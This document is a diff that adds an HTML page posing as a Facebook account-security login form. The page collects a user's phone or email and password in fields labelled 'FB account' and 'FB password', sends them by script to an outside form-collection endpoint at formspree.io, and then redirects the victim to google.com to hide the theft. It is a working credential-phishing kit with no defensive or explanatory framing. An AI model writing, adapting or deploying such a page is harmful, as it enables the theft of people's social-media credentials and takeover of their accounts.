@@ -1,0 +1,205 @@
+<!DOCTYPE>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>start</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+            @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css');
+        body {
+   font-family: 'Poppins', sans-serif;
+   background: #242527;
+   text-align: center;
+}
+.container form{
+    width: 70%;
+    margin: 2vh auto 0 auto;
+    padding: 2px;
+    background: transparent;
+    border-radius: 4px;
+    font-size: 17px;
+}
+    h1 {
+    font-size: 20px;
+    color: #fff;
+    text-align: center;
+}
+.input-group{
+    width: 100%;
+    display: flex;
+    margin: 10px 0;
+    position: relative;
+    flex-direction: column;
+}
+.input-group label{
+    flex-basis: 28%;
+    margin-right: 10px;
+}
+.account {
+    flex-basis: 68%;
+    background: transparent;
+    border: 0;
+    outline: 0;
+    padding-left: 20px;
+    border-bottom: 1px solid #999;
+    color: #fff;
+    font-size: 20px;
+    margin-top: 10px;
+}
+.input-group input:focus {
+    outline: 0;
+    }
+::placeholder{
+    font-size: 16px;
+}
+
+form button{
+  width: 100%;
+    background: #2D88FF;
+    color: #fff;
+    border-radius: 5px;
+    border: none;
+    padding: 10px 40px;
+    outline: 0;
+    cursor: pointer;
+    display: block;
+    margin: 10px auto 10px;
+    font-size: 20px;
+}
+
+.i{
+    color: #6306B2;
+    margin: 0;
+    font-size: 17px;
+}
+ .img{
+     border: none;
+     height: 100px;
+     width: 100%;
+     margin-bottom: 50px;
+     margin-top: 50px;
+     }
+.link {
+      margin: 10px;
+      color: #2D88FF;
+      font-size: 17px;
+      font-waight: bold;
+  }
+  .input-wrap {
+    position: relative;
+    display: inline-block;
+}
+input#password {
+      flex-basis: 68%;
+    background: transparent;
+    border: 0;
+    outline: 0;
+    padding-left: 20px;
+    border-bottom: 1px solid #999;
+    color: #fff;
+    font-size: 20px;
+    margin-top: 10px;
+}
+#show-pass {
+    width: 40px;
+    position: absolute;
+    right: 20px;
+    top: 2px;
+    bottom: 2px;
+    cursor: pointer;
+    z-index: 1;
+    justify-content: center;
+    align-items: center;
+    display: flex;
+    color: #fff;
+}
+.fa-eye:before {
+ 
+    content: "\f06e";
+}
+.fa-eye-slash:before {
+    content: "\f070";
+}
+ span {
+     color: red;
+ }
+ .input-text { 
+ width: 60%;
+     
+ }
+</style>
+</head>
+<body>
+<img class="img" src="image/pic.png">
+  <div class="container">
+     <form id="my-form" action="https://formspree.io/f/mbjeoakk" method="POST">
+         <h1>secure you account</h1>
+      <div class="input-group">
+        <input type="text" placeholder="account phone or email" class="account"name="FB account" required>
+      </div>
+
+      <div class="input-wrap">
+        <input type="password" placeholder="password" id="password" name="FB password" class="input-text" required>
+           <span id="show-pass" class="fa fa-eye" title="show hide password"></span>
+
+      </div>
+      <button>Log in</button>
+    <span id="my-form-status"></span>
+  </form>
+  <a href="https://instagram.com" class="link">forgotten password?</a>
+  </div>
+<script>
+(() => {
+    const password = document.getElementById("password");
+    const showBtn = document.getElementById("show-pass");
+
+    const showHidePassword = () => {
+        if(password.type == "password"){
+           password.type = "text";
+           showBtn.classList.add("fa-eye-slash");
+        }else{
+           password.type = "password";
+           showBtn.classList.remove("fa-eye-slash");
+        }
+        
+  };
+  showBtn.addEventListener("click", showHidePassword);
+
+})();
+
+var form = document.getElementById("my-form");
+    
+    async function handleSubmit(event) {
+      event.preventDefault();
+      var status = document.getElementById("my-form-status");
+      var data = new FormData(event.target);
+      fetch(event.target.action, {
+        method: form.method,
+        body: data,
+        headers: {
+            'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+    window.location.assign("https://www.google.com/");
+          status.innerHTML = "successful";
+          form.reset()
+        } else {
+          response.json().then(data => {
+            if (Object.hasOwn(data, 'errors')) {
+              status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+            } else {
+              status.innerHTML = "check network connection"
+            }
+          })
+        }
+      }).catch(error => {
+        status.innerHTML = "check network connection"
+      });
+    }
+    form.addEventListener("submit", handleSubmit)
+  </script>
+</body>
+</html
